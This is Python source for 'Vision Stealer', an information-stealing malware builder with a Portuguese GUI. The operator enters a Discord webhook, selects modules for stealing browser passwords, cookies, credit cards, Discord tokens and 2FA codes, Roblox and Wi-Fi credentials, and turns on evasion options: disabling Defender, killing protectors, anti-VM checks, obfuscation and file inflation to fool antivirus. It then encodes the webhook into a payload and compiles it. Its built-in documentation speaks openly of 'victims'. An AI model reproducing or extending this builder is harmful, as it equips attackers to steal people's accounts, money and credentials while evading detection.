import base64
import copy
import logging
import os
import random
import re
import shutil
import string
import subprocess
import threading
import time
import webbrowser
from tkinter import filedialog

import customtkinter
import pyuac
import requests
from PIL import Image

# Configuração de Log em português
logging.basicConfig(
    level=logging.DEBUG,
    filename='Vision.log',
    filemode='a',
    format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)


class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        self.title("Vision Stealer")
        self.geometry("1000x550")
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        self.dark_mode()
        webbrowser.open("https://github.com/xvwi")

        self.updated_dictionary = {
            "webhook": None,
            "ping": False,
            "pingtype": None,
            "fakeerror": False,
            "startup": False,
            "defender": False,
            "systeminfo": False,
            "backupcodes": False,
            "browser": False,
            "roblox": False,
            "obfuscation": False,
            "injection": False,
            "minecraft": False,
            "wifi": False,
            "killprotector": False,
            "antidebug_vm": False,
            "discord": False,
            "anti_spam": False,
            "self_destruct": False,
        }

        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
        self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
        
        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Vision.png")), size=(60, 60))
        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Vision.png")), size=(500, 150))
        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Vision.png")), size=(20, 20))
        
        self.dashboard_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "home.png")), size=(30, 30))
        self.docs_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "clipboard.png")), size=(30, 30))
        self.help_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}Vision.ico")

        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="Vision Stealer", image=self.logo_image,
                                                            compound="left", font=customtkinter.CTkFont(size=15, weight="bold", family=self.font))
        self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)

        self.dashboard_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Stealer",
                                                        font=customtkinter.CTkFont(family=self.font, size=13), fg_color="transparent",
                                                        text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                        image=self.dashboard_image, anchor="w", command=self.home_button_event)
        self.dashboard_button.grid(row=1, column=0, sticky="ew")

        self.frame_2_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Documentação", font=customtkinter.CTkFont(
            family=self.font, size=13), fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), image=self.docs_image, anchor="w", command=self.docs_button_event)
        self.frame_2_button.grid(row=2, column=0, sticky="ew")

        self.builder_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="#000000")
        self.builder_frame.grid_columnconfigure(0, weight=1)

        # Builder UI
        self.webhook_button = customtkinter.CTkEntry(self.builder_frame, width=570, height=35, font=customtkinter.CTkFont(
            size=15, family=self.font), placeholder_text="Cole sua Webhook do Discord aqui")
        self.webhook_button.grid(row=0, column=0, sticky="nw", padx=15, pady=20)

        self.checkwebhook_button = customtkinter.CTkButton(master=self.builder_frame, width=100, height=35, text="Testar Webhook",
                                                           command=self.check_webhook_button,
                                                           fg_color="#cc0000", hover_color="#ff0000", font=customtkinter.CTkFont(size=15, family=self.font))
        self.checkwebhook_button.grid(row=0, sticky="ne", padx=15, pady=20)

        self.all_options = customtkinter.CTkLabel(self.builder_frame, text="Opções de Stealer", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
        self.all_options.grid(row=1, column=0, sticky="n", padx=15, pady=8)

        self.ping = customtkinter.CTkCheckBox(self.builder_frame, text="Ping", font=customtkinter.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#cc0000", hover_color="#ff0000")
        self.ping.grid(row=1, column=0, sticky="nw", padx=85, pady=150)

        self.pingtype = customtkinter.CTkOptionMenu(
            self.builder_frame, width=20, values=["Everyone", "Here"],
            font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", button_hover_color="#ff0000", button_color="#990000")
        self.pingtype.set(value="Here")
        self.pingtype.grid(row=1, column=0, sticky="nw", padx=160, pady=148)
        self.pingtype.configure(state="disabled")

        self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Erro Falso", font=customtkinter.CTkFont(
            size=17, family=self.font), fg_color="#cc0000", hover_color="#ff0000")
        self.error.grid(row=1, column=0, sticky="nw", padx=85, pady=105)

        self.startup = customtkinter.CTkCheckBox(
            self.builder_frame, text="Iniciar c/ Windows", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", hover_color="#ff0000")
        self.startup.grid(row=1, column=0, sticky="nw", padx=85, pady=60)

        self.defender = customtkinter.CTkCheckBox(
            self.builder_frame, text="Desativar Defender", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", hover_color="#ff0000")
        self.defender.grid(row=1, column=0, sticky="nw", padx=286, pady=60)

        self.killprotector = customtkinter.CTkCheckBox(
            self.builder_frame, text="Matar Protetor", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", hover_color="#ff0000")
        self.killprotector.grid(row=1, column=0, sticky="nw", padx=286, pady=105)

        self.antidebug_vm = customtkinter.CTkCheckBox(
            self.builder_frame, text="Anti Debug/VM", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", hover_color="#ff0000")
        self.antidebug_vm.grid(row=1, column=0, sticky="nw", padx=286, pady=150)

        self.discord = customtkinter.CTkCheckBox(
            self.builder_frame, text="Info do Discord", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", hover_color="#ff0000")
        self.discord.grid(row=1, column=0, sticky="ne", padx=110, pady=60)

        self.wifi = customtkinter.CTkCheckBox(self.builder_frame, text="Info de Wi-Fi", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#cc0000", hover_color="#ff0000")
        self.wifi.grid(row=1, column=0, sticky="ne", padx=130, pady=105)

        self.minecraft = customtkinter.CTkCheckBox(
            self.builder_frame, text="Info do Minecraft", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", hover_color="#ff0000")
        self.minecraft.grid(row=1, column=0, sticky="ne", padx=99, pady=150)

        self.systeminfo = customtkinter.CTkCheckBox(
            self.builder_frame, text="Info do Sistema", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", hover_color="#ff0000")
        self.systeminfo.grid(row=1, column=0, sticky="nw", padx=85, pady=195)

        self.backupcodes = customtkinter.CTkCheckBox(
            self.builder_frame, text="Códigos 2FA", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", hover_color="#ff0000")
        self.backupcodes.grid(row=1, column=0, sticky="nw", padx=286, pady=195)

        self.browser = customtkinter.CTkCheckBox(
            self.builder_frame, text="Info do Navegador", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", hover_color="#ff0000")
        self.browser.grid(row=1, column=0, sticky="ne", padx=107, pady=195)

        self.roblox = customtkinter.CTkCheckBox(self.builder_frame, text="Info do Roblox", font=customtkinter.CTkFont(size=17, family=self.font),
                                                fg_color="#cc0000", hover_color="#ff0000", command=self.check_roblox)
        self.roblox.grid(row=1, column=0, sticky="nw", padx=85, pady=240)

        self.obfuscation = customtkinter.CTkCheckBox(
            self.builder_frame, text="Ofuscação", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", hover_color="#ff0000")
        self.obfuscation.grid(row=1, column=0, sticky="nw", padx=286, pady=240)

        self.injection = customtkinter.CTkCheckBox(
            self.builder_frame, text="Injeção no App", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#cc0000", hover_color="#ff0000")
        self.injection.grid(row=1, column=0, sticky="ne", padx=130, pady=240)

        self.antispam = customtkinter.CTkCheckBox(self.builder_frame, text="Anti Spam", font=customtkinter.CTkFont(size=17, family=self.font),
                                                  fg_color="#cc0000", hover_color="#ff0000")
        self.antispam.grid(row=1, column=0, sticky="nw", padx=85, pady=285)

        self.self_destruct = customtkinter.CTkCheckBox(self.builder_frame, text="Autodestruição", font=customtkinter.CTkFont(size=17, family=self.font),
                                                       fg_color="#cc0000", hover_color="#ff0000")
        self.self_destruct.grid(row=1, column=0, sticky="nw", padx=286, pady=285)

        self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="Inflar Arquivo", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#cc0000", hover_color="#ff0000", command=self.check_pumper)
        self.pump.grid(row=1, column=0, sticky="ne", padx=112, pady=285)

        self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#cc0000", button_hover_color="#ff0000", button_color="#990000")
        self.pump_size.grid(row=1, column=0, sticky="ne", padx=28, pady=284)
        self.pump_size.set("10mb")
        self.pump_size.configure(state="disabled")

        self.clipboard = customtkinter.CTkCheckBox(self.builder_frame, text="Área de Transferência", font=customtkinter.CTkFont(size=17, family=self.font),
                                                fg_color="#cc0000", hover_color="#ff0000")
        self.clipboard.grid(row=1, column=0, sticky="nw", padx=286, pady=328)

        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", ".py"],
                                                    font=customtkinter.CTkFont(size=32, family=self.font), width=250, height=45,
                                                    fg_color="#cc0000", button_hover_color="#ff0000", button_color="#990000", command=self.multi_commands)
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=365)
        self.fileopts.set("Opções de Arquivo")

        self.icon = customtkinter.CTkButton(self.builder_frame, width=250, text="Adicionar Ícone", fg_color="#cc0000", hover_color="#ff0000",
                                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
        self.icon.grid(row=1, column=0, sticky="ne", padx=85, pady=365)
        self.icon.configure(state="disabled")

        self.filename = customtkinter.CTkEntry(self.builder_frame, width=250, font=customtkinter.CTkFont(size=33, family=self.font),
                                               placeholder_text="Nome do Arquivo")
        self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=420)

        self.build = customtkinter.CTkButton(self.builder_frame, width=250, text="Compilar", font=customtkinter.CTkFont(size=35, family=self.font),
                                             fg_color="#cc0000", hover_color="#ff0000", command=self.buildfile)
        self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=420)

        # Documentation Frame
        self.second_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.second_frame.grid_columnconfigure(0, weight=1)

        self.docs = customtkinter.CTkLabel(self.second_frame, text="Documentação", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
        self.docs.grid(row=1, column=0, sticky="n", padx=0, pady=10)

        self.docsbox = customtkinter.CTkTextbox(self.second_frame, width=725, height=485, font=customtkinter.CTkFont(size=12, weight="bold", family=self.font))
        self.docsbox.grid(row=1, column=0, sticky="n", padx=0, pady=55)
        
        self.docsbox.insert(
            "0.0",
            "Documentação do Vision Stealer - By: qz:\n\n"
            "Iniciar c/ Windows (Add To Startup):\nAdiciona o arquivo à pasta de inicialização do usuário. Assim, quando ele ligar o PC, o arquivo será executado e as informações serão enviadas para o seu webhook novamente.\n\n"
            "Erro Falso (Fake Error):\nGera uma janela de erro falsa quando o arquivo é executado para confundir a vítima.\n\n"
            "Ping:\nMenciona você no Discord no exato momento em que as informações são enviadas para o seu webhook.\n\n"
            "Tipo de Ping (Ping Type):\nExistem duas opções: @everyone e @here. @everyone menciona todos que têm acesso ao canal, e @here menciona as pessoas ativas no canal naquele momento.\n\n"
            "Info do Sistema (System Info):\nObtém as informações do PC do usuário, como nome do PC, SO, endereço IP, endereço MAC, HWID, CPU, GPU e RAM.\n\n"
            "Códigos 2FA (2FA Codes):\nObtém os códigos de autenticação de backup do Discord do usuário.\n\n"
            "Info do Navegador (Browser Info):\nObtém dados dos navegadores, como senhas salvas, histórico, cookies e cartões de crédito.\n\n"
            "Info do Roblox (Roblox Info):\nObtém as informações do Roblox do usuário, como nome de usuário, cookie de sessão e a quantidade de Robux que ele possui.\n\n"
            "Ofuscação (Obfuscation):\nOfusca o arquivo, o que significa que o código-fonte será ilegível e dificultará a remoção ou o spam no seu webhook por parte das vítimas.\n\n"
            "Injeção no App (Injection):\nInjeta um script no cliente do Discord da vítima. Isso significa que, quando eles alterarem qualquer credencial, você receberá a nova senha e o token daquela conta.\n\n"
            "Info do Minecraft (Minecraft Info):\nObtém as informações do Minecraft do usuário, como os dados da sessão e o cache do usuário.\n\n"
            "Info de Wi-Fi (Wifi Info):\nObtém as informações de Wi-Fi do usuário, como senhas de redes salvas.\n\n"
            "Matar Protetor (Kill Protector):\nEncerra programas de proteção do Discord que algumas pessoas usam para evitar o roubo de tokens (bypassa a proteção).\n\n"
            "Anti Debug/VM:\nVerifica se o usuário está usando uma Máquina Virtual (VM) ou tentando depurar o script, encerrando a execução para impedi-los de analisar o código.\n\n"
            "Info do Discord (Discord Info):\nEnvia todas as informações do Discord para cada conta que eles possuírem. Isso inclui e-mail, número de telefone, status do 2FA, tipo de Nitro, token de acesso e códigos de presente não resgatados.\n\n"
            "Anti Spam:\nPermite que a vítima abra o arquivo apenas a cada 60 segundos, evitando que o seu webhook sofra 'rate limit' ou seja espamado.\n\n"
            "Autodestruição (Self Destruct):\nDeleta o arquivo original assim que ele termina de rodar, para que a vítima não possa executá-lo novamente.\n\n"
            "Inflar Arquivo (File Pumper):\nAdiciona megabytes falsos ao arquivo para fazê-lo parecer maior do que é, enganando algumas heurísticas de antivírus.\n\n"
            "Área de Transferência (Clipboard):\nRecupera o último texto que o usuário copiou (Ctrl+C).\n\n"
            "Opções de Compilação (Build Options):\nPyinstaller - Compila um executável standalone com todos os módulos necessários embutidos.\nVantagens: Arquivo único, compilação rápida, fácil de transferir.\nDesvantagens: Facilmente detectado por antivírus, arquivo grande.\n\n"
            ".py - Mantém como script Python normal.\nVantagens: Menor tamanho, quase totalmente indetectável (FUD).\nDesvantagens: Exige que a vítima tenha o Python instalado para rodar nativamente.")

        self.select_frame_by_name("home")

    def select_frame_by_name(self, name):
        self.dashboard_button.configure(fg_color=("gray75", "gray25") if name == "home" else "transparent")
        self.frame_2_button.configure(fg_color=("gray75", "gray25") if name == "frame_2" else "transparent")

        if name == "home":
            self.builder_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.builder_frame.grid_forget()
        if name == "frame_2":
            self.second_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.second_frame.grid_forget()

    def home_button_event(self):
        self.select_frame_by_name("home")

    def docs_button_event(self):
        self.select_frame_by_name("frame_2")

    def dark_mode(self):
        customtkinter.set_appearance_mode("dark")

    def verify_webhook(self):
        webhook = self.webhook_button.get()
        try:
            r = requests.get(webhook, timeout=5)
            if r.status_code == 200:
                return True
            else:
                logging.error(f"Webhook inválido. Código de status: {r.status_code}. Webhook: {webhook}")
                return False
        except Exception as e:
            logging.error(f"Não foi possível verificar o webhook: {e}")
            return False

    def check_webhook_button(self):
        if self.verify_webhook():
            self.checkwebhook_button.configure(width=100, height=35, fg_color="green", hover_color="#0db60e",
                                               text="Webhook Válido", font=customtkinter.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)
            self.updated_dictionary["webhook"] = self.webhook_button.get()
        else:
            self.checkwebhook_button.configure(width=100, height=35, fg_color="#bd1616", hover_color="#ff0000",
                                               text="Webhook Inválido", font=customtkinter.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)

    def check_ping(self):
        if self.ping.get() == 1:
            self.pingtype.configure(state="normal")
        else:
            self.pingtype.configure(state="disabled")

    def check_pumper(self):
        if self.pump.get() == 1:
            self.pump_size.configure(state="normal")
        else:
            self.pump_size.configure(state="disabled")

    def multi_commands(self, value):
        if value == "pyinstaller":
            self.check_icon()
        elif value == ".py":
            self.check_icon()

    def get_mb(self):
        self.mb = self.pump_size.get()
        byte_size = int(self.mb.replace("mb", ""))
        return byte_size

    def check_roblox(self):
        if self.roblox.get() == 1:
            self.browser.select()

    def check_icon(self):
        if self.fileopts.get() == "pyinstaller":
            self.icon.configure(state="normal")
        elif self.fileopts.get() == ".py":
            self.icon.configure(state="disabled")

    def get_icon(self):
        self.iconpath = filedialog.askopenfilename(initialdir="/", title="Selecionar Ícone", filetypes=(("Arquivos ICO", "*.ico"), ("Todos os arquivos", "*.*")))
        self.icon.configure(text="Ícone Adicionado")
        self.builder_frame.after(3500, self.reset_icon_button)

    def reset_icon_button(self):
        self.icon.configure(self.builder_frame, width=250, text="Adicionar Ícone", fg_color="#cc0000", hover_color="#ff0000",
                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)

    def update_config(self, event):
        checkbox_mapping = {
            "webhook": self.webhook_button,
            "ping": self.ping,
            "pingtype": self.pingtype,
            "fakeerror": self.error,
            "startup": self.startup,
            "defender": self.defender,
            "systeminfo": self.systeminfo,
            "backupcodes": self.backupcodes,
            "browser": self.browser,
            "roblox": self.roblox,
            "obfuscation": self.obfuscation,
            "injection": self.injection,
            "minecraft": self.minecraft,
            "wifi": self.wifi,
            "killprotector": self.killprotector,
            "antidebug_vm": self.antidebug_vm,
            "discord": self.discord,
            "anti_spam": self.antispam,
            "self_destruct": self.self_destruct,
            "clipboard": self.clipboard
        }

        for key, checkbox in checkbox_mapping.items():
            try:
                if checkbox.get():
                    if key == "webhook":
                        pass
                    else:
                        self.updated_dictionary[key] = True
                elif checkbox.get() == 0:
                    self.updated_dictionary[key] = False
                ping_message = self.pingtype.get()
                if ping_message in ["Here", "Everyone"]:
                    self.updated_dictionary["pingtype"] = ping_message
                elif self.ping.get() == 0:
                    self.updated_dictionary["pingtype"] = "None"
            except Exception as e:
                logging.error(f"Erro ao atualizar a config: {e}")

    def get_filetype(self):
        try:
            file_type = self.fileopts.get()
            if file_type == ".py":
                logging.info(f"Tipo de arquivo alterado: {file_type}")
                return file_type.replace(".", "")
            else:
                logging.info(f"Tipo de arquivo alterado: {file_type}")
                return file_type
        except Exception as e:
            logging.error(f"Erro ao obter o tipo de arquivo: {e}")

    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color="#cc0000", hover_color="#ff0000", text="Testar Webhook")

    def reset_build_button(self):
        self.build.configure(width=250, text="Compilar", font=customtkinter.CTkFont(size=35, family=self.font),
                             fg_color="#cc0000", hover_color="#ff0000")

    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(width=250, text=f"Compilando{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#cc0000", hover_color="#ff0000")
                time.sleep(0.3)
                self.update()

    def built_file(self):
        self.build.configure(width=250, text="Compilado!", font=customtkinter.CTkFont(size=35, family=self.font),
                             fg_color="#cc0000", hover_color="#ff0000")

    def return_filename(self):
        try:
            get_file_name = self.filename.get().replace(" ", "-")
            if not get_file_name:
                random_name = ''.join(random.choices(string.ascii_letters, k=5))
                logging.info(f"Nome do arquivo obtido: test-{random_name}")
                return f"test-{random_name}"
            else:
                logging.info(f"Nome do arquivo obtido: {get_file_name}")
                return get_file_name
        except Exception as e:
            logging.error(f"Erro ao obter o nome do arquivo: {e}")

    def mask_webhook(self, webhook):
        try:
            if not webhook or not isinstance(webhook, str):
                return "[redacted]"
            return re.sub(r"(/[^/]+/)([^/]+)$", r"/\1***", webhook)
        except Exception:
            return "[redacted]"

    def encode_webhook(self, webhook):
        if not webhook or not isinstance(webhook, str) or not webhook.strip():
            return None
        if webhook.startswith("enc:"):
            return webhook
        key = "VISION_STEALER_2026".encode("utf-8")
        payload = webhook.encode("utf-8")
        encoded = bytearray()
        for i, byte in enumerate(payload):
            encoded.append((byte ^ key[i % len(key)]) & 0xFF)
        return "enc:" + base64.b64encode(bytes(encoded)).decode("ascii")

    def get_config(self):
        try:
            filename_to_read = self.basefilepath + "\\Vision.py" 
            with open(filename_to_read, 'r', encoding="utf-8") as f:
                code = f.read()

            config_regex = r"__CONFIG__\s*=\s*{(.*?)}"
            config_match = re.search(config_regex, code, re.DOTALL)
            if config_match:
                config = config_match.group(0)
            else:
                raise Exception(f"Não foi possível encontrar a config em {filename_to_read}")

            copy_dict = copy.deepcopy(self.updated_dictionary)
            if isinstance(copy_dict.get("webhook"), str):
                copy_dict["webhook"] = self.encode_webhook(copy_dict["webhook"])
            config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
            code = code.replace(config, config_str)
            logging.info(f"Configuração alterada com sucesso")
            return code
        except Exception as e:
            logging.error(f"Erro com a configuração: {e}")

    def file_pumper(self, filename, extension, size):
        try:
            pump_size = size * 1024 ** 2
            with open(f"./{filename}.{extension}", 'ab') as f:
                for _ in range(int(pump_size)):
                    f.write((b'\x00'))
            logging.info(f"Arquivo inflado com sucesso: {filename}.{extension}")
        except Exception as e:
            logging.error(f"Erro ao inflar o arquivo: {e}")

    def compile_file(self, filename, filetype):
        try:
            if self.iconpath is None:
                exeicon = "NONE"
            else:
                exeicon = self.iconpath

            if filetype == "pyinstaller":
                subprocess.run(["py", "./tools/upx.py"])
                subprocess.run(["py", "-m", "PyInstaller",
                                "--onefile", "--clean", "--noconsole",
                                "--upx-dir=./tools", "--distpath=./",
                                "--hidden-import", "base64",
                                "--hidden-import", "ctypes",
                                "--hidden-import", "json",
                                "--hidden-import", "re",
                                "--hidden-import", "time",
                                "--hidden-import", "subprocess",
                                "--hidden-import", "sys",
                                "--hidden-import", "sqlite3",
                                "--hidden-import", "requests_toolbelt",
                                "--hidden-import", "psutil",
                                "--hidden-import", "PIL",
                                "--hidden-import", "PIL.ImageGrab",
                                "--hidden-import", "PIL.Image",
                                "--hidden-import", "Cryptodome",
                                "--hidden-import", "Cryptodome.Cipher",
                                "--hidden-import", "Cryptodome.Cipher.AES",
                                "--hidden-import", "win32crypt",
                                "--icon", exeicon, f"./{filename}.py"])
                
                logging.info(f"Sucesso ao compilar {filename}.exe com pyinstaller")
        except Exception as e:
            logging.error(f"Erro ao compilar o arquivo: {e}")

    def cleanup_files(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.spec', f'./{filename}.py', "./tools/upx.exe"}

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
                    logging.info(f"Diretório removido com sucesso: {clean}")
            except Exception as e:
                logging.error(f"Não foi possível remover o diretório: {clean}. {e}")
                pass
                continue
        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
                    logging.info(f"Arquivo removido com sucesso: {clean}")
            except Exception as e:
                logging.error(f"Não foi possível remover o arquivo: {clean}. {e}")
                pass
                continue

    def write_and_obfuscate(self, filename):
        try:
            self.updated_dictionary["webhook"] = self.webhook_button.get()
            with open(f"./{filename}.py", 'w', encoding="utf-8") as f:
                f.write(self.get_config())

            if self.obfuscation.get() == 1:
                os.system(f"py ./tools/obfuscation.py ./{filename}.py")
                os.remove(f"./{filename}.py")
                os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")
                logging.info(f"Sucesso ao ofuscar o arquivo: {filename}.py")
        except Exception as e:
            logging.error(f"Erro ao gravar e ofuscar o arquivo: {e}")

    def buildfile(self):
        try:
            filename = self.return_filename()
            self.updated_dictionary["webhook"] = self.webhook_button.get().strip()
            self.update_config(None)

            if self.get_filetype() == "py":
                self.write_and_obfuscate(filename)

                if self.pump.get() == 1:
                    self.file_pumper(filename, "py", self.get_mb())

                self.built_file()
                self.builder_frame.after(3000, self.reset_build_button)

            elif self.get_filetype() == "pyinstaller":
                self.write_and_obfuscate(filename)

                thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
                thread.start()
                self.building_button_thread(thread)

                if self.pump.get() == 1:
                    self.file_pumper(filename, "exe", self.get_mb())

                self.built_file()
                self.builder_frame.after(3000, self.reset_build_button)
                self.cleanup_files(filename)

        except Exception as e:
            logging.error(f"Erro ao construir o arquivo: {e}")


if __name__ == "__main__":
    if not pyuac.isUserAdmin():
        logging.error("O arquivo deve ser executado com privilégios de administrador")
        pyuac.runAsAdmin()
    else:
        app = App()
        app.mainloop()